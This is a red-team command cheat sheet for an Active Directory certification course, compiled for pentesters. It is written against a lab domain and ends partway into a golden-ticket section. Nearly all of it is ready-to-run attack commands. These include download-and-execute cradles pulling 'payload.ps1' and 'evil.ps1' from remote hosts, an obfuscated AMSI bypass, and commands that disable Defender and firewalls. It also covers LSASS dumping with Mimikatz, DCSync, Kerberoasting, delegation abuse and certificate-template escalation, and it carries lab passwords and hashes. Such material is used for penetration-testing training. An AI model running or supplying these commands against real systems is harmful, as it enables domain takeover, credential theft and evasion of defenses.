# Certified Read Team Expert (CRTE) - Cheatsheet 

 **Name** : **CRTE - Active Directory Command Cheat Sheet (Powershell)**

 **Course Link** : https://www.alteredsecurity.com/redteamlab

 **Compiled By** : **Nikhil Raj ( Twitter: https://twitter.com/0xn1k5 | Blog: https://organicsecurity.in )**

 **Version: 1.0**
 
 **Last Updated** : 13 Feb 2023

 **Disclaimer** : This cheat sheet has been compiled from multiple sources with the objective of aiding fellow pentesters and red teamers in their learning. The credit for all the tools and techniques belongs to their original authors. I have added a reference to the original source at the bottom of this document.  

#### Basic Operations

```powershell
# Loading powerview locally
ps> . C:\AD\Tools\PowerView.ps1

# Loading ActiveDirectory Module (Also works in Constrained Language Mode)
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1

# Loading tools remotely using download and execute cradle
ps> iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
ps> iex (iwr 'http://192.168.230.1/evil.ps1' -UseBasicParsing)

# File Download using windows binary
bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\User\\Public\\Loader.exe

# File Transfer using shared drive
echo F | xcopy \\us-jump\C$\Users\Public\lsass.dmp C:\AD\Tools\lsass.dmp

# Base 64 encode and decode
certutil -decode foo.b64 foo.exe
certutil -encode foo.exe foo.b64

```


#### Bypassing Endpoint Security, Applocker and Powershell Logging

```powershell
1. Powershell Logging
# Use Invisi-Shell to bypass powershell logging (has inbuild AMSI evasion)
# NOTE: Invisi-Shell may interfere with some process like Saftelykatz, use Loader.exe for such cases

# With Admin Rights
C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
# Without Admin Rights (modifies registry entries, and is recommended method)
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

2. AV Evasion

# Disable Windows Defender & AMSI bypass script
Get-MPPreference
Set-MPPreference -DisableRealTimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

# AMSI Bypass
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Use AMSI Trigger and DefenderCheck
cmd> AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke\PowerShellTcp_Detected.ps1
cmd> DefenderCheck.exe PowerUp.ps1

# Bypass AMSI and ETW based detection by loading the binary using loader utility
C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe
C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe

3. Applocker & WDAC Bypas

# Check if Powershell is running in Constrained Language Mode (It may be because of Applocker or WDAC)
$ExecutionContext.SessionState.LanguageMode

# Check applocker policy for Application Whitelisting via Powerview and Registry (reg.exe)
Get-AppLockerPolicy –Effective
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2

# Identify the GPO Policy responsible Applocker
Get-DomainGPO -Domain us.techcorp.local | ? { $_.DisplayName -like "*PAW*" } | select displayname, gpcfilesyspath

# Download the GPO Registry Policy file from sysvol share on AD to view applocker policy details
type "\\us.techcorp.local\SysVol\us.techcorp.local\Policies\{AFC6881A-5AB6-41D0-91C6-F2390899F102}\Machine\Registry.pol"

# Based on policy we need to identify the bypass technique for Applocker (like Whitelisted path)
Get-Acl C:\Windows\Tasks | fl

# Check Windows Device Guard (WDAC) enforcement policy
wmi
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard

# Bypass for WDAC using rundll32.exe and comsvcs.dll to dump the lsass process
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass.dmp full
echo F | xcopy \\us-jump\C$\Users\Public\lsass.dmp C:\AD\Tools\lsass.dmp
Invoke-Mimikatz -Command "sekurlsa::minidump C:\AD\Tools\lsass.DMP"

```


#### Lateral Movement

```powershell
# Check for access on other computers using current users session
Find-LocalAdminAccess -Verbose
Find-WMILocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess.ps1
cme smb <COMPUTERLIST> -d <DOMAIN> -u <USER> -H <NTLM HASH>
cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH> -X <COMMAND>

# Use WMI for remote session
Get-WmiObject -Class win32_operatingsystem -ComputerName us-dc.us.techcorp.local

# Create PS Session 
$usmgmt = New-PSSession -ComputerName us-mgmt
Enter-PSSession $usmgmt

$passwd = ConvertTo-SecureString 't7HoBF+m]ctv.]' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("us-mailmgmt\administrator", $passwd)
$mailmgmt = New-PSSession -ComputerName us-mailmgmt -Credential $creds
Enter-PSSession $mailmgmt

# Invoke Command using Powershell Remoting
Invoke-Command -Scriptblock {Get-Process} -Session $usmgmt
Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list-of-server>)
Invoke-Command -FilePath C:\scripts\Get-PassHases.ps1 -ComputerName (Get-Content <list-of-server>)
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $mailmgmt
Invoke-Command -Scriptblock ${function:Get-PassHashes} -ComputerName (Get-Content <list-of-server>)
Invoke-Command -Scriptblock ${function:Get-PassHashes} -ComputerName (Get-Content <list-of-server>) -ArgumentList

# Use winrs for ps remoting without logging
winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
winrs -remote:US-MAILMGMT -u:US-MAILMGMT\administrator -p:';jv-2@6e#m]!8O' cmd.exe

# Runas cmd as another user
runas /netonly /user:us\serviceaccount  cmd.exe

# Manage Firewall Port Access
netsh advfirewall firewall add rule name="Allow Port 8080" protocol=TCP dir=in localport=8080 action=allow
netsh advfirewall firewall add rule name="Allow Port 8081" protocol=TCP dir=in localport=8081 action=allow
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.X

# disable firewall
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
powershell.exe -c 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False'

# Add user to local admin and RDP group and enable RDP on firewall
net user <USERNAME> <PASSWORD> /add /Y  && net localgroup administrators <USERNAME> /add && net localgroup "Remote Desktop Users" <USERNAME> /add && reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

````

#### Lateral Movement - Credentials Harvesting

```powershell
# Check if lsass.exe is running as protected process
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL" 

## Dumping Credentials
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
Invoke-Mimikatz -Command '"sekurlsa::logonpassword"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
Invoke-Mimikatz -Command '"lsadump::sam"'

# Dump Secrets stored in windows vault
Invoke-Mimikatz -Command '"vault::list"'
Invoke-Mimikatz -Command '"vault::cred /patch"'
Invoke-Mimikatz -Command '"sekurlsa::minidump lsass.dmp"'

# Other Mimikatz based utility for duping lsass.exe
SafetyKatz.exe "sekurlsa::ekeys"
SharpKatz.exe --Command ekeys
rundll32.exe C:\Dumpert\Outflank\Dumpert.dll,Dump
pypykatz.exe live lsa

tasklist /FI "IMAGENAME eq lsass.exe" 
rundll32.exe C:\windows\System32\comsvcs.dll,MiniDump <lsass_process_ID> C:\Users\Public\lsass.dmp full

.\mimikatz.exe
mimikatz # sekurlsa::minidump c:\Ad\Tools\lsass.dmp
mimikatz # privilege::debug
mimikatz # sekurlsa::keys
mimikatz # exit

# Lateral Movement - OverPass The Hash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:aes /run:powershell.exe"'
SafetyKatz.exe "sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:aes /run:powershell.exe" "exit"

# Generate TGT and inject in current session for double hopping (no admin rights for 1st command)
Rubeus.exe asktgt /user:administrator /rc4:ntlmHash /ptt
Rubeus.exe asktgt /user:administrator /aes256:<key> /opsec /createnetonly:c:\Windows\System32\cmd.exe /show /ptt

# DCSync 
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

#### Post Exploitation

```powershell
## Limit this command if there are too many files ;)
tree /f /a C:\Users

# Web.config
C:\inetpub\www\*\web.config

# Unattend files
C:\Windows\Panther\Unattend.xml

# RDP config files
C:\ProgramData\Configs\

# Powershell scripts/config files
C:\Program Files\Windows PowerShell\

# PuTTy config
C:\Users\[USERNAME]\AppData\LocalLow\Microsoft\Putty

# FileZilla creds
C:\Users\[USERNAME]\AppData\Roaming\FileZilla\FileZilla.xml

# Jenkins creds (also check out the Windows vault, see above)
C:\Program Files\Jenkins\credentials.xml

# WLAN profiles
C:\ProgramData\Microsoft\Wlansvc\Profiles\*.xml

# TightVNC password (convert to Hex, then decrypt with e.g.: https://github.com/frizb/PasswordDecrypts)
Get-ItemProperty -Path HKLM:\Software\TightVNC\Server -Name "Password" | select -ExpandProperty Password

# Look for SAM file
Get-ChildItem -path C:\Windows\Repair\* -include *.SAM*,*.SYSTEM* -force -Recurse 
Get-ChildItem -path C:\Windows\System32\config\RegBack\*  -include *.SAM*,*.SYSTEM* -force -Recurse
Get-ChildItem -path C:\* -include *.SAM*,*.SYSTEM* -force -Recurse 

# Check Registry for password
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Check for unattend and sysgrep files
Get-ChildItem -path C:\* -Recurse -Include *Unattend.xml*
Get-ChildItem -path C:\Windows\Panther\* -Recurse -Include *Unattend.xml* 
Get-ChildItem -path C:\Windows\system32\* -Recurse -Include *sysgrep.xml*, *sysgrep.inf* 
Get-ChildItem -path C:\* -Recurse -Include *Unattend.xml*, *sysgrep.xml*, *sysgrep.inf* 

# Look for powershell history files
Get-Childitem -Path C:\Users\* -Force -Include *ConsoleHost_history* -Recurse -ErrorAction SilentlyContinue

# Hardcoded Password in scripts
Get-ChildItem -path C:\*  -Recurse -Include *.xml,*.ps1,*.bat,*.txt  | Select-String "password"| Export-Csv C:\Scripts\Report.csv -NoTypeInformation
Get-ChildItem -path C:\*  -Recurse -Include *.xml,*.ps1,*.bat,*.txt  | Select-String "creds"| Export-Csv C:\Scripts\Report.csv -NoTypeInformation

# Azure token
Get-ChildItem -path "C:\Users\*" -Recurse -Include *accessTokens.json*, *TokenCache.dat*, *AzureRmContext.json*

# Dump Password Vault
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | % { $_.RetrievePassword();$_ }

# Find the IDs of protected secrets for a specific user
dir C:\Users\[USERNAME]\AppData\Local\Microsoft\Credentials

# Get information, including the used master key ID, from a specific secret (take the path from above)
dpapi::cred /in:C:\Users\[USERNAME]\AppData\Local\Microsoft\Credentials\1EF01CC92C17C670AC9E57B53C9134F3

# IF YOU ARE PRIVILEGED
# Dump all master keys from the current system
sekurlsa::dpapi

# IF YOU ARE NOT PRIVILEGED (session as target user required)
# Get the master key from the domain using RPC (the path contains the user SID, and then the ID of the masterkey identified in the previous step)
dpapi::masterkey /rpc /in:C:\Users\[USERNAME]\AppData\Roaming\Microsoft\Protect\S-1-5-21-3865823697-1816233505-1834004910-1124\dd89dddf-946b-4a80-9fd3-7f03ebd41ff4

# Decrypt the secret using the retrieved master key
# Alternatively, leave out /masterkey and add /unprotect to decrypt the secret using the cached master key (see above for caveats)
dpapi::cred /in:C:\Users\[USERNAME]]\AppData\Local\Microsoft\Credentials\1EF01CC92C17C670AC9E57B53C9134F3 /masterkey:91721d8b1ec[...]e0f02c3e44deece5f318ad

```

## Domain Enumeration

#### Domian Details

```powershell
# Get domain details  
Get-Domain
Get-Domain -Domain techcorp.local
Get-DomainSID

Get-DomainPolicyData
(Get-DomainPolicyData).systemaccess
(Get-DomainPolicyData -domain techcorp.local).systemaccess

Get-DomainController -Domain techcorp.local
```

#### Domian User, Group and Computer Objects

```powershell
# Domains Users
Get-DomainUser -Identity studentuser1 -Properties *
Get-DomainUser -LDAPFilter "Description=*" | Select Name,Description
Get-DomainUser -TrustedToAuth | Select Name, msds-allowedtodelegateto
Get-DomainUser -SPN | Select Name, ServicePrincipalName

# Domain Groups
Get-DomainGroup -Domain techcorp.local
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Find group membership of a user
Get-DomainGroup -UserName studentuser1
Get-DomainGroup -UserName 'studentuser41' | select distinguishedname
net user student41 /domain
whoami /groups

# Script to find group membership of user recursively 
function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName) { $groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName | select -ExpandProperty distinguishedname) $groups if ($groups.count -gt 0) { foreach ($group in $groups) { Get-ADPrincipalGroupMembershipRecursive $group } } };
Get-ADPrincipalGroupMembershipRecursive 'studentuserx'

# Find local group on machine (admin required for non-dc machines)
Get-NetLocalGroup -ComputerName us-dc

# Get members of local groups idenitied in prvious steps on a machine
Get-NetLocalGroupMember -ComputerName us-dc
Get-NetLocalGroupMember -ComputerName us-dc -GroupName Administrators

# Domain Computers
Get-DomainComputer | select Name
Get-DomainComputer -Unconstrained | select Name
Get-DomainComputer -TrustedToAuth | select Name, msds-allowedtodelegateto

# Interesting share
Get-DomainFileServer
Get-DomainDFSShare
Get-NetShare
Find-DomainShare
Find-InterestingDomainShareFile
Get-Childitem -Path C:\ -Force -Include <FILENAME OR WORD TO SEARCH> -Recurse -ErrorAction SilentlyContinue

# Find Foreign Group Member (ForeignSecurityPrinicpals container as the container is populated only when a principal is added to a domain local security group, and not by adding user as pricipal owner via ACL)
Find-ForeignGroup -Verbose
Find-ForeignUser -Verbose
Get-DomainForeignGroupMember
Get-DomainForeignGroupMember -Domain <TARGET DOMAIN FQDN>
````

#### Domain GPO & OU Enumeration

```powershell
# GPO Enumeration
Get-DomainGPO

# Enumerate GPOs appliable to a given machine 
Get-DomainGPO -ComputerIdentity student41.us.techcorp.local | select displayname

# Find the GPO of RestrictedGroup type for local group membership
Get-DomainGPOLocalGroup

# Find the users which are in local group of a machine using GPO
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity us-mgmt

# Find machines where a given user is member of specific group
Get-DomainGPOUserLocalGroupMapping -Identity studentuser41

# Get users which are in a local group of a machine in any OU using GPO
(Get-DomainOU).distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping

# Get users which are in a local group of a machine in a particular OU using GPO
(Get-DomainOU -Identity 'OU=Mgmt,DC=us,DC=techcorp,DC=local').distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping

## Domain Enumeration - OU 

# Enumerate OU (associated GPO ID is present in GPLINK attribute)
Get-DomainOU | select displayname, gplink

# Find GPO applied to given OU by doing lookup of GPO ID identified in previous step
Get-DomainGPO -Identity '{FCE16496-C744-4E46-AC89-2D01D76EAD68}'

# Find users which are in local group of computers across all OUs
(Get-DomainOU).distinguishedname | %{Get-DomainComputer -SearchBase $_ } | Get-DomainGPOComputerLocalGroupMapping

(Get-DomainOU -Identity 'OU=Mgmt,DC=us,DC=techcorp,DC=local').distinguishedname | %{Get-DomainComputer -SearchBase $_ } | Get-DomainGPOComputerLocalGroupMapping

```

#### Domain ACL Enumeration

```powershell
# Find ACL associated with any given object
Get-DomainObjectAcl -Identity Student41
Get-DomainObjectAcl -Identity Student41 -ResolveGUIDs | select -First 1

# Find ACL accositaed with given LDAP Path
Get-DomainObjectAcl -Searchbase "LDAP://CN=Domain Admins,CN=Users,DC=us,DC=techcorp,DC=local" -ResolveGUIDs

# Find Intresting Domain ACL
Find-InterestingDomainAcl -ResolveGUIDs | select -First 1
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentuserx"}

# Find ACL Associated with PATH
Get-PathAcl -Path "\\us-dc\sysvol"

# Enumerate permissions for group
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl

Reference:
https://github.com/cyberark/ACLight
```

#### Domain Trust Enumeration

```powershell
# Enumerate the trust for current domain
Get-DomainTrust
Get-DomainTrust -Domain Techcorp.local

# Enumerate Forest Level details
Get-Forest
Get-ForestDomain
Get-ForestGlobalCatalog
Get-ForestTrust

# Trust Enumeration using AD Module
(Get-ADForest).Domains
Get-ADTrust -Filter *
```

#### Domain User Hunting

```powershell
## Domain Enumeration - User Hunting

# Find the local admin access across all the computers
Find-localAdminAccess

# Use WMI and PSRemoting for remote system access
Find-WMILocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess.ps1

# Find the active session of Domain User/Group 
Find-DomainUserLocation
Find-DomainUserLocation -CheckAccess
Find-DomainUserLocation -UserGroupIdentity "StudentUsers"
Find-DomainUserLocation -Stealth

```


#### BloodHound

```powershell
# Run sharphound collector 
cd C:\AD\Tools\BloodHound-master\Collectors
SharpHound.exe --CollectionMethods All

# Use powershell based collector
. C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1
Invoke-BloodHound -CollectionMethods All

#Copy neo4j-community-3.5.1 to C:\
#Open cmd
cd C:\neo4j\neo4j-community-3.5.1-windows\bin
neo4j.bat install-service
neo4j.bat start
#Browse to BloodHound-win32-x64 
Run BloodHound.exe
#Change credentials and login
```

#### Privilege Escalation - Local

```powershell
## Privilege Escalation

# PrivEsc Tools
Invoke-PrivEsc (PrivEsc)
winPEASx64.exe (PEASS-ng)

# PowerUp
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks
Get-SericeUnquoted -Verbose
Get-ModifiableServiceFile -Verbose
Get-ModifiableService -Verbose

Invoke-ServiceAbuse -Name "ALG" 
Invoke-ServiceAbuse -Name ALG -UserName us\studentuserx -Verbose
Invoke-ServiceAbuse -Name "ALG" -Command "net localgroup Administrators studentuser41 /add"
Write-ServiceBinary -Name 'VulnerableSvc' -Command 'c:\windows\system32\rundll32 c:\Users\Public\beacon.dll,Update' -Path 'C:\Program Files\VulnerableSvc'

net localgroup Administrators

net.exe stop VulnerableSvc
net.exe start VulnerableSvc

```

#### Privilege Escalation - Domain

```powershell

>> Privilege Escalation - Kerberosting

# Keberoasting
Get-DomainUser -SPN | select cn, serviceprincipalname
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec /outfile:hashes.txt

# Targeted Kerberosting
Set-DomainObject -Identity support1user -Set @{serviceprincipalname='us/myspn'}

# Cracking the password
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt

>> Privilege Escalation - gMSA

- Step 1. Identify the gMSA account by filtering ObjectClass 
Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'

- Step 2. Identify pricipal having access to the gMSA account via ADModule
Get-ADServiceAccount -Filter * -Properties name, ObjectClass
Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword

- Step 3. Fetch the Password Blob
$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'

- Step 4. Convert the password blob to NTLM hash
Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword

- Step 5. Use the passwd hash
C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:jumpone /domain:us.techcorp.local /ntlm:0a02c684cc0fa1744195edd1aec43078 /run:cmd.exe" "exit"
```


#### Local Administrator Password Solution (LAPS)

```powershell

# Check for presence of AdmPwd.dll at below location on the Machine locally
ls 'C:\Program Files\LAPS\CSE\AdmPwd.dll'

# Check existance of LAPS in domain
Get-AdObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=<DOMAIN>,DC=<DOMAIN>'
Get-DomainComputer | Where-object -property ms-Mcs-AdmPwdExpirationTime | select-object samaccountname
Get-DomainGPO -Identity *LAPS*

# Check to which computers the LAPS GPO is applied to
Get-DomainOU -GPLink "Distinguishedname from GET-DOMAINGPO -Identity *LAPS*" | select name, distinguishedname
Get-DomainComputer -Searchbase "LDAP://<distinguishedname>" -Properties Distinguishedname

# Parse the GPO policy file for LAPS (https://github.com/PowerShell/GPRegistryPolicy))
Parse-PolFile "<GPCFILESYSPATH FROM GET-DOMAINGPO>\Machine\Registry.pol" | select ValueName, ValueData

# Fetch the password for given system, if current user has Read/GenericAll access
Get-DomainObject -Identity us-mailmgmt | select -ExpandProperty ms-mcs-admpwd
Get-DomainComputer -Identity us-mailmgmt | select name,ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

# Find users who can read the LAPS password of machine in OU
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { ($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')}

Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { ($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}

# Using AD module
. .\Get-lapsPermissions.ps1
Get-AdmPwdPassword -ComputerName US-MAILMGMT

# Using LAPS Module
Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1
Find-AdmPwdExtendedRights -Identity OUDistinguishedName
Get-AdmPwdPassword -ComputerName US-MAILMGMT

```


#### Active Directory Certificate Services (ADCS)

```powershell

# Conditions of vulnerable certificate template which can be abused
- CA grants normal/low privileged users enrollment rights
- Manager approval is disabled
- Authorization signatures are not required
- target template grants normal/low privileged users enrollment rights


>> Enumerating - Active Directory certificate Service (ADCS) 

# Identify the ADCS service installation
Certify.exe cas

# Enumerate the templates configured
Certify.exe find

# Enumerate the vulnerable templates
Certify.exe find /vulnerable

# If the enrolleeSuppliesSubject is not not allowed for all domain users, it wont show up in vulnerable template and needs to enumerated seperately (ESC1)
Certify.exe find /enrolleeSuppliesSubject


>> Persistance (THEFT-4): Extracting User and Machine certificates

# List all certificates for local machine in certificate store
ls cert:\LocalMachine\My

# Export the certificate in PFX format
ls cert:\LocalMachine\My\89C1171F6810A6725A47DB8D572537D736D4FF17 | Export-PfxCertificate -FilePath C:\Users\Public\pawadmin.pfx -Password (ConvertTo-SecureString -String 'niks' -Force -AsPlainText)

# Use Mimikatz to export certificate in pfx format (default cert pass is mimikatz)
Invoke-mimikatz -Command "crypto::certificates /export"
Invoke-mimikatz -Command "!crypto::certificates /systemstore:local_machine /export"
cat cert.pfx | base64 -w 0
C:\AD\Tools\Rubeus.exe asktgt /user:nlamb /certificate:MNeg[...]IH0A== /password:mimikatz /nowrap /ptt



>> Escalation (ESC-1) : Domain User to Domain Admin and Enterprise Admin 

CASE I: Domain Admin

# Request certificate for DA user using ESC1 technique, and save it as cert.pem
Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator

# Convert cert.pem to cert.pfx format
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx

# Request TGT using pfx cerificate and inject into memory
Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:niks /nowrap /ptt

CASE II: Enterprise Admin

# Request certificate for EA user using ESC1 technique
Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator

# Convert cert.pem to cert.pfx format
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\EA.pfx

# Request TGT using pfx cerificate and inject into memory
Rubeus.exe asktgt /user:techcorp.local\Administrator
/dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx /password:niks /nowrap /ptt

```


#### Kerberos Delegation

```powershell

>> Unconstrained Delegation

# Step 1. Identify Computer Account with Unconstrained Delegation
Get-DomainComputer -Unconstrained | select samaccountname

# Step 2. Use PrintSpool attack to force DC$ machine account running print spooler service to authenticate with our Web server having unconstrained delegation enabled. 
.\MS-RPRN.exe \\us-dc.techcorp.local \\us-web.us.techcorp.local
.\Petitpotam.exe us-web us-dc

# Step 3. Login to unconstrained server and execute Rubeus to monitor for ticket
.\Rubeus.exe monitor /nowrap /targetuser:US-DC$ /interval:5

# Step 4. Use the Base64 encoded TGT 
.\Rubeus.exe ptt /ticket:abcd==

NOTE: Above injected ticket cannot be used directly for code execution but DCSync will work

# Step 5. DCsync 
. .\Invoke-Mimi.ps1
Invoke-Mimi -Command '"lsadump::dcsync /user:us\krbtgt"'
Invoke-Mimi -Command '"lsadump::dcsync /user:us\Administrator"'
C:\AD\Tools\SharpKatz.exe --Command dcsync --User techcorp\administrator --Domain techcorp.local --DomainController techcorp-dc.techcorp.local


>> Constrained Delegation

- Kerberos Only delegation
- Protocol Transition for non kerberos service

# Step 1. Identify a Computer or User account having constrained delegation enabled
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto

# Steo 2. Request TGS for Alternate service using the session of affected user
.\Rubeus.exe s4u /user:appsvc /rc4:1d49d390ac01d568f0ee9be82bb74d4c /impersonateuser:Administrator /msdsspn:"CIFS/us-mssql" /altservice:HTTP /domain:us.techcorp.local /ptt

# Step 3. Access the service
winrs -r:us-mssql cmd

NOTE: Use the same name for remote connection as specified in msdsspn attribute



>> Resource Based Constrained Delegation (RBCD) attack

- Requires admin rights on one of domian joined system or ablility to join our computer to domain
- Write permission on Target System to set msDS-AllowedToActOnBehalfOfOtherIdentity attribute


CASE I: Using existing Computer for RBCD attack

STEP 1. Identify the Computer(us-helpdesk) where our principal (mgmtadmin) has GenericAll/Write access 

ps> Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'mgmtadmin'}

ps> Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

STEP 2. Set the delegation attribute to a Computer Account where we have local admin access (student41$)

# Find the SID of Computer Account (student41)
ps> Get-DomainComputer -Identity student41 -Properties objectSid

# Login as mgmtadmin user, and Set the delegation attribute to Computer Account (us-helpdesk)
ps> $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-210670787-2521448726-163245708-16151)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "us-helpdesk" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose

STEP 3. Perform PTH using student41$ computer account

ps> Rubeus.exe s4u /user:student41$ /rc4:b62c7c107072398d7c81a2639e986b97 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt

STEP 4. Access the system as admin
winrs -r:us-helpdesk cmd.exe


CASE II. Creating fake computer account for RBCD attack

- Every domain user can add machines to Ad based ms-DS-MachineAccountQuota which is set to 10, which will allow us to create fake computer object with known password and add it to domain
- Write Permission on Target System to set msDS-AllowedToActOnBehalfOfOtherIdentity

STEP 1. Create a new Machine Account user PowerMad.ps1 script
ps> . C:\AD\Tools\Powermad.ps1
ps> New-MachineAccount -MachineAccount studentcompX

STEP 2. Use above Computer account (created by powermad) instead of student41$ machine account, and rest of the steps stay the same.


```


## Kerberos Attacks

#### Golden Ticket

```powershell
# Persistance technique for creating fake TGT ticket using KDC account hash (krbtgt)

# Get Domain Detals
Get-Domain | select name
us.techcorp.local

Get-DomainSID
S-1-5-21-210670787-2521448726-163245708

# Fetch krbtgt ntlm and aes hash
Invoke-Mimi -Command '"lsadump::dcsync /user:krbtgt"'

# Use above details to create a golden ticket impersonating Administrator user
